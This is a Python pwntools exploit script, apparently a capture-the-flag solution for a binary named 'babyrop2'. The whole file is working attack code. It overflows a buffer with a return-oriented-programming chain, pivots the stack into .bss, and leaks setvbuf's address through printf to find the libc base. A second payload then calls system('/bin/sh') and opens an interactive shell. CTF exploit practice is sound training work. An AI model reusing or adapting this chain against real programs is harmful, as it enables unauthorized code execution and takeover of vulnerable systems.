from pwn import *
import sys, os

log.info("For remote: %s HOST PORT" % sys.argv[0])
bin_name = "babyrop2"

try:
  r = remote(sys.argv[1], int(sys.argv[2]))
except:
  r = process(bin_name) #, env = {})


def do_debug (cmd = ""):
  try:
    if sys.argv[1] == 'debug':
      gdb.attach (r, cmd)
  except:
    pass

elf = ELF (bin_name);
context.word_size = elf.elfclass

libc = ELF('libc.so.6') if os.path.exists('libc.so.6') else elf.libc

context.terminal = ["tmux", "splitw", "-h"]
#context.log_level = 'debug'

def rr ():
  r.recvuntil ("> ")

def menu (idx):
  rr ()
  r.sendline (str(idx))


r.recvuntil ("name?")


bss = elf.bss (0x900)
prdi =  0x400733
prsip = 0x400731
read = 0x400500
leaveret = 0x4006ca
printf = 0x4004f0

pay = "A"* 0x20 + p64(bss+8) + p64 (prdi) + p64(elf.got['setvbuf']) + p64 (printf) + p64(prdi) + p64(0) + p64(prsip) + p64(bss) * 2 + p64 (read) + p64(leaveret)
print len (pay)

r.sendline (pay)
r.recvline ()
libc_leak = u64 (r.recv(6) + "\x00\x00")

log.info ('libc leak: ' + hex(libc_leak))

libc_base = libc_leak - libc.symbols['setvbuf']
log.info ('libc base: ' + hex(libc_base))

system = libc_base + libc.symbols['system']
pay2 = "/bin/sh".ljust (16, "\x00") + p64(prdi) + p64(bss) + p64(system)

r.sendline (pay2)
r.interactive ()



